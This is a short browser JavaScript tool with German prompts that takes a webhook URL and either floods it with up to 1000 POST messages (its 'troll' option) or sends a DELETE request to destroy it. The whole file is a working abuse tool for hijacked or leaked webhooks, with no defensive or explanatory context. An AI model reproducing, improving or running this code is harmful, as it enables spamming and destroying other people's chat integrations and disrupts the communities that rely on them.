let step = 0;
let webhookID = "";
let message = "";
let amount = 0;
let option = "";

function handleKeyPress(event) {
    if (event.key === "Enter") {
        let input = document.getElementById("input").value.trim();
        document.getElementById("input").value = "";
        processInput(input);
    }
}

function processInput(input) {
    let output = document.getElementById("output");

    if (step === 0) {
        if (input === "1") {
            option = "troll";
            step = 1;
            output.innerHTML += "<br>Geben Sie die Webhook-ID ein:";
        } else if (input === "2") {
            option = "delete";
            step = 1;
            output.innerHTML += "<br>Geben Sie die Webhook-ID ein:";
        } else {
            output.innerHTML += "<br>Ungültige Eingabe! Bitte wählen Sie 1 oder 2.";
        }
    } 
    else if (step === 1) {
        webhookID = input;
        if (option === "troll") {
            step = 2;
            output.innerHTML += "<br>Geben Sie die Nachricht ein:";
        } else {
            deleteWebhook(webhookID);
        }
    } 
    else if (step === 2) {
        message = input;
        step = 3;
        output.innerHTML += "<br>Wie oft soll die Nachricht gesendet werden? (Max 1000)";
    } 
    else if (step === 3) {
        amount = parseInt(input);
        if (isNaN(amount) || amount < 1 || amount > 1000) {
            output.innerHTML += "<br>Ungültige Anzahl! Bitte eine Zahl zwischen 1 und 1000 eingeben.";
        } else {
            spamWebhook(webhookID, message, amount);
        }
    }
}

function spamWebhook(webhookID, message, amount) {
    let output = document.getElementById("output");
    output.innerHTML += "<br>Starte Spam...";
    
    for (let i = 0; i < amount; i++) {
        fetch(webhookID, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        }).catch(err => console.error("Fehler:", err));
    }
    
    output.innerHTML += "<br>Nachrichten gesendet!";
    step = 0;
}

function deleteWebhook(webhookID) {
    let output = document.getElementById("output");

    fetch(webhookID, { method: "DELETE" })
        .then(() => output.innerHTML += "<br>Webhook gelöscht!")
        .catch(err => output.innerHTML += "<br>Fehler beim Löschen!");

    step = 0;
}
